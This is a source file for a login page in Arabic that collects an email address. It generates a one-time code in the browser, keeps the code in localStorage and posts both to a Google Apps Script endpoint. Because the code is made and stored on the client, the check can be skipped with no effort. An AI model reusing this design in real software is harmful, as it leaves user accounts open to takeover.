<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تسجيل الدخول</title>
    <style>
        body { 
            font-family: sans-serif; 
            margin: 0; 
            display: flex; 
            justify-content: center; 
            background-color: #EAF0E9; 
            min-height: 100vh; 
        }

        #main-container { 
            max-width: 400px; 
            width: 100%; 
            padding: 50px 20px 0 20px; 
        }

        .welcome-title { 
            font-size: 28px; 
            font-weight: bold; 
            margin-bottom: 30px; 
            color: #1a1a1a; 
            text-align: right; 
        }

        .input-box { 
            width: 100%; 
            padding: 18px; 
            margin-bottom: 20px; 
            border: 1px solid #c8d1c7; 
            border-radius: 12px; 
            font-size: 18px; 
            box-sizing: border-box; 
            text-align: right; 
            outline: none; 
            background-color: #ffffff;
        }

        .toggle-container { 
            display: flex; 
            align-items: center; 
            justify-content: flex-end; 
            gap: 12px; 
            margin-bottom: 35px; 
        }

        /* تصميم زر التبديل (Switch) */
        .switch-btn { 
            position: relative; 
            display: inline-block; 
            width: 50px; 
            height: 26px; 
        }

        .switch-btn input { opacity: 0; width: 0; height: 0; }

        .slider-round { 
            position: absolute; 
            cursor: pointer; 
            top: 0; left: 0; right: 0; bottom: 0; 
            background-color: #bdc3bc; 
            transition: .4s; 
            border-radius: 34px; 
        }

        .slider-round:before { 
            position: absolute; 
            content: ""; 
            height: 18px; 
            width: 18px; 
            right: 4px; 
            bottom: 4px; 
            background-color: white; 
            transition: .4s; 
            border-radius: 50%; 
        }

        input:checked + .slider-round { background-color: #2EAF4A; }
        input:checked + .slider-round:before { transform: translateX(-22px); }

        .login-button { 
            width: 100%; 
            background-color: #2EAF4A; 
            color: white; 
            border: none; 
            padding: 16px; 
            border-radius: 12px; 
            font-size: 20px; 
            font-weight: bold; 
            cursor: pointer; 
            transition: 0.3s; 
        }

        .login-button:disabled { 
            opacity: 0.7; 
            cursor: not-allowed; 
        }
    </style>
</head>
<body>

<div id="main-container">
    <div class="welcome-title">مرحبا</div>
    
    <input type="email" id="emailInput" placeholder="البريد الإلكتروني" class="input-box">
    
    <div class="toggle-container">
        <span style="font-size: 16px; color: #333; font-weight: bold;">تذكر البريد الالكتروني</span>
        <label class="switch-btn">
            <input type="checkbox" id="rememberCheck" checked>
            <span class="slider-round"></span>
        </label>
    </div>

    <button id="loginBtn" onclick="processLogin()" class="login-button">ولوج</button>
</div>

<script>
    async function processLogin() {
        const emailField = document.getElementById('emailInput');
        const email = emailField.value.trim();
        const btn = document.getElementById('loginBtn');

        if (!email) {
            alert("يرجى إدخال البريد الإلكتروني");
            return;
        }

        // 1. تخزين الإيميل محلياً
        localStorage.setItem('storedEmail', email);

        // 2. توليد رمز وحفظه للمقارنة في الصفحة الثانية
        const otp = Math.floor(100000 + Math.random() * 900000).toString();
        localStorage.setItem('currentOTP', otp);

        btn.disabled = true;
        btn.innerText = "جاري التحقق...";

        // الرابط الجديد الذي أرسلته
        const scriptURL = 'https://script.google.com/macros/s/AKfycbwJVluCdukgUFnQwB9XADRPdAtZwRvifSzlH7hxV-Lr4YiXi7wsftLc_qRQ_hc84FDE2g/exec';

        try {
            // 3. إرسال POST Request بصيغة JSON
            await fetch(scriptURL, {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ 
                    email: email,
                    otp: otp 
                })
            });

            // 4. الانتقال لصفحة التحقق
            window.location.href = "verify/";

        } catch (error) {
            console.error("Error:", error);
            // انتقال احتياطي لضمان تجربة المستخدم
            window.location.href = "verify/";
        }
    }

    // استرجاع البريد عند التحميل إذا كان موجوداً
    window.onload = () => {
        const savedEmail = localStorage.getItem('storedEmail');
        if (savedEmail) {
            document.getElementById('emailInput').value = savedEmail;
        }
    };
</script>

</body>
</html>
